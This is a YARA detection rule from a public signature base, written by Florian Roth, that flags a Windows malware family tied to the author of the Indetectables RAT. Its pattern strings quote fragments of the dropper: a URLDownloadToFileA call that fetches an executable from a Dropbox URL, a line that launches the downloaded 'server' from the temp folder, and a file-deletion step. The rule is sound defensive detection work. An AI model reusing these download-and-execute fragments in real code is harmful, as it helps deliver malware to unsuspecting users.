rule BergSilva_Malware
{
	meta:
		description = "Detects a malware from the same author as the Indetectables RAT"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2015-10-01"
		super_rule = 1
		hash1 = "00e175cbad629ee118d01c49c11f3d8b8840350d2dd6d16bd81e47ae926f641e"
		hash2 = "6b4cbbee296e4a0e867302f783d25d276b888b1bf1dcab9170e205d276c22cfc"
		os = "windows"
		filetype = "executable"

	strings:
		$x1 = "C:\\Users\\Berg Silva\\Desktop\\" wide
		$x2 = "URLDownloadToFileA 0, \"https://dl.dropbox.com/u/105015858/nome.exe\", \"c:\\nome.exe\", 0, 0" fullword wide
		$s1 = " Process.Start (Path.GetTempPath() & \"name\" & \".exe\") 'start server baixado" fullword wide
		$s2 = "FileDelete(@TempDir & \"\\nome.exe\") ;Deleta o Arquivo para que possa ser executado normalmente" fullword wide
		$s3 = " Lib \"\\WINDOWS\\system32\\UsEr32.dLl\"" fullword wide
		$s4 = "$Directory = @TempDir & \"\\nome.exe\" ;Define a variavel" fullword wide
		$s5 = "https://dl.dropbox.com/u/105015858" wide

	condition:
		uint16(0)==0x5a4d and (1 of ($x*) or 2 of ($s*))
}
